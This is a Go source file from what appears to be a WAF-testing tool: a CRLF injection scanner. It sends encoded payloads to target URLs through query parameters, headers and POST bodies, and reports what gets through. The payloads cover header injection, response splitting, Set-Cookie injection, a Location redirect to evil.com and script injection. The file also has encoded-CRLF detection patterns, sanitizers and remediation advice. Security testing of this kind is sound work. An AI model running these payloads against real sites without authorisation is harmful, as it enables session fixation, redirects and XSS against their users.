// Package crlf provides CRLF (Carriage Return Line Feed) injection detection.
// It tests for HTTP response splitting, header injection, and log injection
// vulnerabilities.
package crlf

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
	"github.com/waftester/waftester/pkg/ui"
)

// VulnerabilityType represents the type of CRLF vulnerability
type VulnerabilityType string

const (
	VulnResponseSplitting VulnerabilityType = "http-response-splitting"
	VulnHeaderInjection   VulnerabilityType = "header-injection"
	VulnLogInjection      VulnerabilityType = "log-injection"
	VulnCachePoison       VulnerabilityType = "cache-poisoning-via-crlf"
	VulnXSSViaCRLF        VulnerabilityType = "xss-via-crlf"
	VulnSetCookie         VulnerabilityType = "set-cookie-injection"
)

// Severity levels
type Severity string

const (
	SeverityCritical Severity = "critical"
	SeverityHigh     Severity = "high"
	SeverityMedium   Severity = "medium"
	SeverityLow      Severity = "low"
)

// Vulnerability represents a detected CRLF vulnerability
type Vulnerability struct {
	Type        VulnerabilityType `json:"type"`
	Description string            `json:"description"`
	Severity    Severity          `json:"severity"`
	URL         string            `json:"url"`
	Parameter   string            `json:"parameter,omitempty"`
	Payload     string            `json:"payload"`
	Evidence    string            `json:"evidence"`
	Remediation string            `json:"remediation"`
	CVSS        float64           `json:"cvss"`
}

// Payload represents a CRLF injection payload
type Payload struct {
	Value       string
	Encoded     string
	Description string
	Type        VulnerabilityType
	Header      string // Expected injected header
}

// ScanResult contains the results of a CRLF scan
type ScanResult struct {
	URL             string          `json:"url"`
	StartTime       time.Time       `json:"start_time"`
	EndTime         time.Time       `json:"end_time"`
	Duration        time.Duration   `json:"duration"`
	Vulnerabilities []Vulnerability `json:"vulnerabilities"`
	TestedPayloads  int             `json:"tested_payloads"`
}

// TesterConfig configures the CRLF tester
type TesterConfig struct {
	Timeout     time.Duration
	UserAgent   string
	Concurrency int
	TestParams  []string
	TestHeaders []string
	Client      *http.Client
}

// Tester performs CRLF injection tests
type Tester struct {
	config *TesterConfig
	client *http.Client
}

// DefaultConfig returns a default configuration
func DefaultConfig() *TesterConfig {
	return &TesterConfig{
		Timeout:     httpclient.TimeoutFuzzing,
		UserAgent:   ui.UserAgent(),
		Concurrency: 5,
		TestParams: []string{
			"redirect",
			"url",
			"return",
			"returnUrl",
			"next",
			"goto",
			"destination",
			"path",
			"file",
			"page",
			"view",
			"name",
			"user",
		},
		TestHeaders: []string{
			"X-Forwarded-For",
			"X-Forwarded-Host",
			"X-Custom-IP-Authorization",
			"Referer",
			"User-Agent",
		},
	}
}

// NewTester creates a new CRLF tester
func NewTester(config *TesterConfig) *Tester {
	if config == nil {
		config = DefaultConfig()
	}

	client := config.Client
	if client == nil {
		client = httpclient.Default()
	}

	return &Tester{
		config: config,
		client: client,
	}
}

// GetPayloads returns CRLF injection payloads
func (t *Tester) GetPayloads() []Payload {
	marker := "waftester"

	return []Payload{
		// Basic CRLF injection
		{
			Value:       "\r\nX-Injected: " + marker,
			Encoded:     "%0d%0aX-Injected:%20" + marker,
			Description: "Basic CRLF header injection",
			Type:        VulnHeaderInjection,
			Header:      "X-Injected",
		},
		{
			Value:       "\r\n\r\n<html>" + marker + "</html>",
			Encoded:     "%0d%0a%0d%0a<html>" + marker + "</html>",
			Description: "HTTP response splitting",
			Type:        VulnResponseSplitting,
			Header:      "",
		},

		// Double encoded
		{
			Value:       "\r\nX-Double: " + marker,
			Encoded:     "%250d%250aX-Double:%20" + marker,
			Description: "Double URL encoded CRLF",
			Type:        VulnHeaderInjection,
			Header:      "X-Double",
		},

		// Unicode encoding
		{
			Value:       "\r\nX-Unicode: " + marker,
			Encoded:     "%E5%98%8A%E5%98%8DX-Unicode:%20" + marker,
			Description: "Unicode encoded CRLF",
			Type:        VulnHeaderInjection,
			Header:      "X-Unicode",
		},

		// Set-Cookie injection
		{
			Value:       "\r\nSet-Cookie: injected=" + marker,
			Encoded:     "%0d%0aSet-Cookie:%20injected=" + marker,
			Description: "Set-Cookie header injection",
			Type:        VulnSetCookie,
			Header:      "Set-Cookie",
		},

		// Cache poisoning via CRLF
		{
			Value:       "\r\nX-Cache-Poison: " + marker,
			Encoded:     "%0d%0aX-Cache-Poison:%20" + marker,
			Description: "Cache poisoning via CRLF",
			Type:        VulnCachePoison,
			Header:      "X-Cache-Poison",
		},

		// XSS via CRLF
		{
			Value:       "\r\n\r\n<script>alert('" + marker + "')</script>",
			Encoded:     "%0d%0a%0d%0a<script>alert('" + marker + "')</script>",
			Description: "XSS via HTTP response splitting",
			Type:        VulnXSSViaCRLF,
			Header:      "",
		},

		// Content-Type injection
		{
			Value:       "\r\nContent-Type: text/html\r\n\r\n<html>" + marker + "</html>",
			Encoded:     "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>" + marker + "</html>",
			Description: "Content-Type injection with body",
			Type:        VulnResponseSplitting,
			Header:      "Content-Type",
		},

		// Location header injection
		{
			Value:       "\r\nLocation: http://evil.com/" + marker,
			Encoded:     "%0d%0aLocation:%20http://evil.com/" + marker,
			Description: "Location header injection (redirect)",
			Type:        VulnHeaderInjection,
			Header:      "Location",
		},

		// Alternative encodings
		{
			Value:       "\r\nX-Alt1: " + marker,
			Encoded:     "%0D%0AX-Alt1:%20" + marker, // uppercase
			Description: "Uppercase encoded CRLF",
			Type:        VulnHeaderInjection,
			Header:      "X-Alt1",
		},
		{
			Value:       "\nX-LFOnly: " + marker,
			Encoded:     "%0aX-LFOnly:%20" + marker, // LF only
			Description: "LF only injection",
			Type:        VulnHeaderInjection,
			Header:      "X-LFOnly",
		},
		{
			Value:       "\rX-CROnly: " + marker,
			Encoded:     "%0dX-CROnly:%20" + marker, // CR only
			Description: "CR only injection",
			Type:        VulnHeaderInjection,
			Header:      "X-CROnly",
		},
	}
}

// TestParameter tests a specific parameter for CRLF injection
func (t *Tester) TestParameter(ctx context.Context, baseURL string, param string) ([]Vulnerability, error) {
	var vulns []Vulnerability

	payloads := t.GetPayloads()

	for _, payload := range payloads {
		// Test in query parameter
		testURL := baseURL
		if strings.Contains(testURL, "?") {
			testURL += "&" + param + "=" + payload.Encoded
		} else {
			testURL += "?" + param + "=" + payload.Encoded
		}

		vuln, err := t.testURL(ctx, testURL, param, payload)
		if err != nil {
			continue
		}
		if vuln != nil {
			vulns = append(vulns, *vuln)
		}
	}

	return vulns, nil
}

// testURL tests a URL for CRLF injection
func (t *Tester) testURL(ctx context.Context, testURL string, param string, payload Payload) (*Vulnerability, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", t.config.UserAgent)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer iohelper.DrainAndClose(resp.Body)

	// Check for header injection
	evidence := t.detectInjection(resp, payload)
	if evidence != "" {
		return &Vulnerability{
			Type:        payload.Type,
			Description: payload.Description,
			Severity:    getSeverity(payload.Type),
			URL:         testURL,
			Parameter:   param,
			Payload:     payload.Encoded,
			Evidence:    evidence,
			Remediation: GetCRLFRemediation(),
			CVSS:        getCVSS(payload.Type),
		}, nil
	}

	return nil, nil
}

// detectInjection checks if the response shows signs of CRLF injection
func (t *Tester) detectInjection(resp *http.Response, payload Payload) string {
	// Check for injected header
	if payload.Header != "" {
		if val := resp.Header.Get(payload.Header); val != "" {
			if strings.Contains(val, "waftester") {
				return fmt.Sprintf("Injected header '%s' found with value: %s", payload.Header, val)
			}
		}
	}

	// Check for Set-Cookie injection
	if payload.Type == VulnSetCookie {
		for _, cookie := range resp.Cookies() {
			if cookie.Name == "injected" {
				return fmt.Sprintf("Injected cookie found: %s=%s", cookie.Name, cookie.Value)
			}
		}
	}

	// Check for response splitting (body contains our marker after blank line)
	if payload.Type == VulnResponseSplitting || payload.Type == VulnXSSViaCRLF {
		body, err := iohelper.ReadBody(resp.Body, iohelper.MediumMaxBodySize)
		if err == nil {
			bodyStr := string(body)
			if strings.Contains(bodyStr, "waftester") {
				return fmt.Sprintf("Response splitting detected, body contains marker")
			}
			if strings.Contains(bodyStr, "<script>alert") {
				return "XSS payload found in response body"
			}
		}
	}

	// Check all response headers for markers
	for name, values := range resp.Header {
		for _, val := range values {
			if strings.Contains(val, "waftester") {
				return fmt.Sprintf("Marker found in header '%s': %s", name, val)
			}
		}
	}

	return ""
}

// TestHeader tests CRLF injection via request headers
func (t *Tester) TestHeader(ctx context.Context, targetURL string, headerName string) ([]Vulnerability, error) {
	var vulns []Vulnerability

	payloads := t.GetPayloads()

	for _, payload := range payloads {
		req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", t.config.UserAgent)

		// Try to inject via header (Note: Go HTTP client sanitizes these)
		// This is mainly for documentation/awareness
		req.Header.Set(headerName, "test"+payload.Value)

		resp, err := t.client.Do(req)
		if err != nil {
			continue
		}

		evidence := t.detectInjection(resp, payload)
		iohelper.DrainAndClose(resp.Body)

		if evidence != "" {
			vulns = append(vulns, Vulnerability{
				Type:        payload.Type,
				Description: fmt.Sprintf("CRLF via header: %s", headerName),
				Severity:    getSeverity(payload.Type),
				URL:         targetURL,
				Parameter:   headerName,
				Payload:     payload.Value,
				Evidence:    evidence,
				Remediation: GetCRLFRemediation(),
				CVSS:        getCVSS(payload.Type),
			})
		}
	}

	return vulns, nil
}

// TestPOST tests CRLF injection in POST body
func (t *Tester) TestPOST(ctx context.Context, targetURL string, param string) ([]Vulnerability, error) {
	var vulns []Vulnerability

	payloads := t.GetPayloads()

	for _, payload := range payloads {
		formData := url.Values{}
		formData.Set(param, payload.Encoded)

		req, err := http.NewRequestWithContext(ctx, "POST", targetURL,
			strings.NewReader(formData.Encode()))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", defaults.ContentTypeForm)
		req.Header.Set("User-Agent", t.config.UserAgent)

		resp, err := t.client.Do(req)
		if err != nil {
			continue
		}

		evidence := t.detectInjection(resp, payload)
		iohelper.DrainAndClose(resp.Body)

		if evidence != "" {
			vulns = append(vulns, Vulnerability{
				Type:        payload.Type,
				Description: fmt.Sprintf("POST CRLF: %s", payload.Description),
				Severity:    getSeverity(payload.Type),
				URL:         targetURL,
				Parameter:   param,
				Payload:     payload.Encoded,
				Evidence:    evidence,
				Remediation: GetCRLFRemediation(),
				CVSS:        getCVSS(payload.Type),
			})
		}
	}

	return vulns, nil
}

// Scan performs a comprehensive CRLF scan
func (t *Tester) Scan(ctx context.Context, targetURL string) (*ScanResult, error) {
	startTime := time.Now()
	result := &ScanResult{
		URL:       targetURL,
		StartTime: startTime,
	}

	payloads := t.GetPayloads()
	totalPayloads := 0

	// Test each parameter
	for _, param := range t.config.TestParams {
		vulns, err := t.TestParameter(ctx, targetURL, param)
		if err != nil {
			continue
		}
		result.Vulnerabilities = append(result.Vulnerabilities, vulns...)
		totalPayloads += len(payloads)
	}

	result.TestedPayloads = totalPayloads
	result.EndTime = time.Now()
	result.Duration = result.EndTime.Sub(startTime)

	return result, nil
}

// Helper functions

func getSeverity(vulnType VulnerabilityType) Severity {
	switch vulnType {
	case VulnResponseSplitting, VulnXSSViaCRLF:
		return SeverityCritical
	case VulnHeaderInjection, VulnSetCookie, VulnCachePoison:
		return SeverityHigh
	case VulnLogInjection:
		return SeverityMedium
	default:
		return SeverityMedium
	}
}

func getCVSS(vulnType VulnerabilityType) float64 {
	switch vulnType {
	case VulnResponseSplitting:
		return 9.1
	case VulnXSSViaCRLF:
		return 8.2
	case VulnHeaderInjection:
		return 7.5
	case VulnSetCookie:
		return 7.1
	case VulnCachePoison:
		return 7.5
	case VulnLogInjection:
		return 5.3
	default:
		return 6.0
	}
}

// Remediation guidance

// GetCRLFRemediation returns remediation for CRLF vulnerabilities
func GetCRLFRemediation() string {
	return `To fix CRLF injection vulnerabilities:
1. Sanitize all user input that's used in HTTP headers
2. Remove or encode CR (\r, %0d) and LF (\n, %0a) characters
3. Use framework functions that properly escape header values
4. Validate URLs before redirects - no newlines allowed
5. Use allowlists for redirect destinations
6. Implement Content-Security-Policy headers
7. Configure WAF to detect CRLF patterns
8. Never directly include user input in response headers`
}

// AllVulnerabilityTypes returns all CRLF vulnerability types
func AllVulnerabilityTypes() []VulnerabilityType {
	return []VulnerabilityType{
		VulnResponseSplitting,
		VulnHeaderInjection,
		VulnLogInjection,
		VulnCachePoison,
		VulnXSSViaCRLF,
		VulnSetCookie,
	}
}

// IsCRLFCharacter checks if a string contains CRLF characters
func IsCRLFCharacter(input string) bool {
	return strings.ContainsAny(input, "\r\n")
}

// IsCRLFEncoded checks if a string contains URL-encoded CRLF
func IsCRLFEncoded(input string) bool {
	patterns := []string{
		"%0d", "%0D", "%0a", "%0A",
		"%0d%0a", "%0D%0A",
		"%250d", "%250a",
		"%E5%98%8A", "%E5%98%8D", // Unicode newlines
	}

	lower := strings.ToLower(input)
	for _, p := range patterns {
		if strings.Contains(lower, strings.ToLower(p)) {
			return true
		}
	}

	return false
}

// SanitizeCRLF removes CRLF characters from input
func SanitizeCRLF(input string) string {
	result := strings.ReplaceAll(input, "\r", "")
	result = strings.ReplaceAll(result, "\n", "")
	return result
}

// SanitizeCRLFEncoded removes encoded CRLF patterns
func SanitizeCRLFEncoded(input string) string {
	// Common URL-encoded patterns
	patterns := []string{
		"%0d", "%0D", "%0a", "%0A",
		"%0d%0a", "%0D%0A",
		"%250d", "%250a", "%250D", "%250A",
	}

	result := input
	for _, p := range patterns {
		// Case-insensitive replacement
		re := regexp.MustCompile("(?i)" + regexp.QuoteMeta(p))
		result = re.ReplaceAllString(result, "")
	}

	return result
}

// GenerateCRLFPayloads generates custom CRLF payloads
func GenerateCRLFPayloads(headerName, headerValue string) []string {
	return []string{
		// URL encoded
		"%0d%0a" + headerName + ":%20" + url.QueryEscape(headerValue),
		// Double encoded
		"%250d%250a" + headerName + ":%20" + url.QueryEscape(headerValue),
		// Unicode
		"%E5%98%8A%E5%98%8D" + headerName + ":%20" + url.QueryEscape(headerValue),
		// Mixed case
		"%0D%0A" + headerName + ":%20" + url.QueryEscape(headerValue),
		// CR only
		"%0d" + headerName + ":%20" + url.QueryEscape(headerValue),
		// LF only
		"%0a" + headerName + ":%20" + url.QueryEscape(headerValue),
	}
}

// VulnerabilityToJSON converts vulnerability to JSON
func VulnerabilityToJSON(v Vulnerability) (string, error) {
	data, err := json.MarshalIndent(v, "", "  ")
	if err != nil {
		return "", err
	}
	return string(data), nil
}
